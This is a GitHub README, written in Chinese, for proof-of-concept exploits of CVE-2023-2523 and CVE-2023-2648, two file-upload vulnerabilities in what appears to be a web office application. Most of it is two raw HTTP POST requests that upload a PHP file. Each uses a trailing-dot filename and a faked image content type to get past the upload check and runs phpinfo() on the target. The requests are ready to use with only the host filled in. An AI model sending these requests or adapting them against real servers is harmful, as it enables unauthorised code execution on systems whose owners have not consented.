## cve-2023-2523

备注：脚本上传了phpinfo文件

使用方法：

结果自动保存到result.txt文件

<img width="718" alt="图片" src="https://github.com/bingtangbanli/cve-2023-2523-and-cve-2023-2648/assets/77956516/9880c28c-49e9-42f0-92a6-0cbca20bd2fb">

手工POC：

```
POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1
Host: your-ip
Content-Length: 352
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close
 
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="upload_quwan"; filename="1.php."
Content-Type: image/jpeg
 
<?php phpinfo();?>
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream
 
 
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
```


## cve-2023-2648

备注：脚本上传了phpinfo文件

使用方法：

结果自动保存到result.txt文件

<img width="713" alt="图片" src="https://github.com/bingtangbanli/cve-2023-2523-and-cve-2023-2648/assets/77956516/60583e7a-e2ba-4697-af95-b2f4a755b59a">

手工POC：

```
POST /inc/jquery/uploadify/uploadify.php  HTTP/1.1
Host: your-ip
Content-Length: 204
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close
 
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="Fdiledata"; filename="uploadify.php."
Content-Type: image/jpeg
 
<?php phpinfo();?>
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
```
